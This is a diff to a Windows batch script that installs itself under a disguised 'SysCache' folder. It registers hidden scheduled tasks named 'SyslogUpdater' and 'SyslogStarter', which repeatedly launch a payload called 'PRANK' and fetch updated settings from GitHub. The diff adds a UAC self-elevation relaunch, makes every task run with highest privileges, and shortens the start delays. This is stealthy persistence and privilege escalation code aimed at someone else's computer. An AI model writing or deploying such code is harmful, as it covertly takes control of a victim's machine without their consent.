@@ -2,6 +2,15 @@
 setlocal enabledelayedexpansion
 
 :: ============================================================
+:: Check for administrator privileges and relaunch if needed
+:: ============================================================
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: ============================================================
 :: Configuration
 :: ============================================================
 set "BASE=%APPDATA%\SysCache"
@@ -20,8 +29,8 @@ set "DOWNLOAD=%TEMP%\sn.cmd"
 set "CONFIG=%TEMP%\config.txt"
 
 :: Default values (if GitHub unreachable)
-set "DEFAULT_INIT_DELAY=10"
-set "DEFAULT_INTERVAL=5"
+set "DEFAULT_INIT_DELAY=3"
+set "DEFAULT_INTERVAL=3"
 
 :: ============================================================
 :: Create base folder if missing
@@ -94,9 +103,9 @@ if exist "%LOCAL_INTERVAL%" (
 )
 
 if not "!LOCAL_INTERVAL!"=="!REMOTE_INTERVAL!" (
-    :: Update the scheduled task with the new interval
+    :: Update the scheduled task with the new interval (run with highest privileges)
     schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
-    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /f >nul 2>&1
+    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /rl HIGHEST /f >nul 2>&1
     echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
 )
 
@@ -142,8 +151,8 @@ echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
 for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('HH:mm')"') do set "START_TIME=%%i"
 for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('MM/dd/yyyy')"') do set "START_DATE=%%i"
 
-:: Create the one‑time task that will launch the updater with --first-run
-schtasks /create /tn "SyslogStarter" /sc once /st %START_TIME% /sd %START_DATE% /tr "cmd /c start /min \"\" \"%UPDATER%\" --first-run" /f >nul 2>&1
+:: Create the one‑time task that will launch the updater with --first-run (run with highest privileges)
+schtasks /create /tn "SyslogStarter" /sc once /st %START_TIME% /sd %START_DATE% /tr "cmd /c start /min \"\" \"%UPDATER%\" --first-run" /rl HIGHEST /f >nul 2>&1
 
 :: Mark installation as done
 echo Installed > "%INSTALL_FLAG%"
@@ -178,9 +187,9 @@ echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
 :: Run the payload (visible) for the first time
 if exist "%PRANK%" start "" "%PRANK%"
 
-:: Create the recurring updater task with the current interval
+:: Create the recurring updater task with the current interval (run with highest privileges)
 schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
-schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /f >nul 2>&1
+schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /rl HIGHEST /f >nul 2>&1
 
 :: Optionally delete the one‑time starter task (it won't run again, but clean up)
 schtasks /delete /tn "SyslogStarter" /f >nul 2>&1
